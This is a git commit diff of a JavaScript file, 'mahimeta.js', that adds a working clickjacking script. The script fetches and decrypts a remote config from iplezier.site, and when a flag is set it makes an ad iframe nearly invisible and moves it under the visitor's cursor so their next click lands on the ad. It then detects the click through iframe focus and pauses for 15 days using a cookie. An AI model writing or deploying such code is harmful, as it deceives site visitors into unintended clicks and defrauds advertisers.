eb69b34cca86646f3306d5d723b101f024656e5d
Rafael Costa <orracosta@icloud.com>
2019-12-12 16:41:58 -0300

    added mahimeta script

--- iplezierJS/mahimeta.js
+++ iplezierJS/mahimeta.js
@@ -1,8 +1,9 @@
-let h12_monitorTracker = null;
-let h12_canTrack = 0;
-let h12_div = null;
-let h12_iframe = null;
-let h12_pointerTracker = function(e){
+let monitorTracker = null;
+let canTrack = 0;
+let div = null;
+let iframe = null;
+
+let pointerTracker = function(e){
     let out = {x:0, y:0};
     if(e.type == 'touchstart' || e.type == 'touchmove' || e.type == 'touchend' || e.type == 'touchcancel' || e.type == 'touchforcechange'){
         let touch = e.originalEvent.touches[0] || e.originalEvent.changedTouches[0];
@@ -14,7 +15,17 @@ let h12_pointerTracker = function(e){
     }
     return out;
 };
-function h12_setCookie(strCookie, strValor, lngHoras) {
+function randomizeArray(a) {
+    let j, x, i;
+    for (i = a.length - 1; i > 0; i--) {
+        j = Math.floor(Math.random() * (i + 1));
+        x = a[i];
+        a[i] = a[j];
+        a[j] = x;
+    }
+    return a;
+}
+function setCookie(strCookie, strValor, lngHoras) {
     let dtmData = new Date();
     let strExpires = null;
     if (lngHoras) {
@@ -25,7 +36,7 @@ function h12_setCookie(strCookie, strValor, lngHoras) {
     }
     document.cookie = strCookie + "=" + strValor + strExpires + "; path=/";
 }
-function h12_getCookie(strCookie) {
+function getCookie(strCookie) {
     let strNomeIgual = strCookie + "=";
     let arrCookies = document.cookie.split(';');
     for (let i = 0; i < arrCookies.length; i++) {
@@ -39,49 +50,53 @@ function h12_getCookie(strCookie) {
     }
     return null;
 }
-function h12_revertDiv() {
-    h12_canTrack = 0;
-    $("#" + h12_div).css("top", "").css("left", "").css("z-index", "").css("position", "").css("opacity", "");
+function revertDiv() {
+    canTrack = 0;
+    $("#" + div).css("top", "").css("left", "").css("z-index", "").css("position", "").css("opacity", "");
+    $('#' + div + ' div').css('position', 'fixed');
 }
-function h12_startScript(){
-    h12_div = $('div[id^="h12c_"]')[0].id;
-    h12_iframe = $('iframe[id^="h12c_"]')[0].id;
+function startScript(){
+    let tempIframe = $('ins[id^="mMTag_Responsive"]');
+    //randomizeArray(tempIframe);
+    div = tempIframe[0].id;
+    iframe = $('#' + div + ' iframe')[0].id;
 
     $("body").css("overflow-x", "hidden").css("width", "100%");
     $(document).on('mousemove touchstart', function(e){
-        let tracker = h12_pointerTracker(e);
-        if (h12_canTrack == 1) {
-            $("#" + h12_div).css({
-                left:  tracker.x - $("#" + h12_div).width() / 2,
-                top:   tracker.y - $("#" + h12_div).height()
+        let tracker = pointerTracker(e);
+        if (canTrack == 1) {
+            $("#" + div).css({
+                left:  tracker.x - $("#" + div).width() / 2,
+                top:   tracker.y - $("#" + div).height()
             });
         }
     });
 
-    if(h12_getCookie("_iplz2_delay_time") == null){
-        h12_followDiv();
+    if(getCookie("_iplz2_delay_time") == null){
+        followDiv();
     }
 }
-function h12_followDiv() {
-    h12_canTrack = 1;
-    h12_startTracker();
-    $("#" + h12_div).css("z-index", "9999999").css("position", "absolute").css("opacity", "0.0001");
+function followDiv() {
+    canTrack = 1;
+    startTracker();
+    $("#" + div).css("z-index", "91000").css("position", "absolute").css("opacity", "0.0001");
+    $('#' + div + ' div').css('position', '');
 }
-function h12_setClick(){
-    h12_setCookie("_iplz2_delay_time", '1', 12);
+function setClick(){
+    setCookie("_iplz2_delay_time", '1', 24 * 15);
     document.activeElement.blur();
 }
-function h12_startTracker() {
-    h12_monitorTracker = setInterval(function(){
+function startTracker() {
+    monitorTracker = setInterval(function(){
         let elem = document.activeElement;
-        if(elem && elem.tagName == 'IFRAME' && elem.id == h12_iframe){
-            setTimeout(h12_setClick,200);
-            setTimeout(h12_revertDiv,1000);
-            clearInterval(h12_monitorTracker);
+        if(elem && elem.tagName == 'IFRAME' && elem.id == iframe){
+            setTimeout(setClick,200);
+            setTimeout(revertDiv,1000);
+            clearInterval(monitorTracker);
         }
     }, 500);
 }
-function h12_Decrypt(s1, id) {
+function Decrypt(s1, id) {
     s1 = atob(s1);
     var result = '';
     var xx2 = s1.charAt(0);
@@ -106,15 +121,15 @@ function h12_Decrypt(s1, id) {
     return result;
 }
 $(document).ready(function () {
-    fetch('https://www.iplezier.site/assets/js/c/jquery.json?ver=' + $.now())
+    fetch('https://www.iplezier.site/assets/js/c/rc.json?ver=' + $.now())
         .then(function(response) {
             return response.text();
         })
         .then(function(body) {
-            let jsonResponse = JSON.parse(h12_Decrypt(body, 1247));
+            let jsonResponse = JSON.parse(Decrypt(body, 1247));
 
             if(jsonResponse.redecanais === true){
-                setTimeout(h12_startScript,4500);
+                setTimeout(startScript,4500);
             }
         });
 });
